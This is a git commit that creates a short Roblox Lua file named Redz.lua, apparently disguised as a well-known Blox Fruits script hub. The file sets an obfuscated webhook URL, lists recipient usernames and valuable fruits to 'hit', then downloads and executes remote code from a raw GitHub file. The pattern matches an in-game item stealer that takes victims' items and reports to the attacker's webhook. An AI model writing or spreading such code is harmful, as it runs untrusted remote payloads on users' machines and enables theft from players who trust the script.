43d18231d8df161a0f8f35544ee4de358f4d0297
soowd321 <147211854+soowd321@users.noreply.github.com>
2025-04-14 17:26:22 +0300

    Create Redz.lua

---
+++ Redz.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=UU9zYVpSNEJGUFJDaXhEcGtpZEFFUToxazhWUDNwRFdJa094MUl4YUdKRlN3MHFBZVRKdFE5NkdxTW1uQ3Y1Ti1qZWtHNkxPR2FBYjB1MWRuN0hFYlVXbzNmN2g4RnRlWTJhTU1rbVZyT0dXRWZRU3ZhRDJvVmR0U0RpNW1jdFlaSTMySFBIUTQyQ0xJNGJINzhrLU4zZEhTSHNfRzJ3dXF0cjlrYUxSVFNYS2tCUTFIU3NQMmotNVQzczVoWFBiMTA"
+Usernames = {"Plslegfruit1243 Loly99910nzn"}
+FruitsToHit = {"Kitsune-Kitsune", "Yeti-Yeti"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
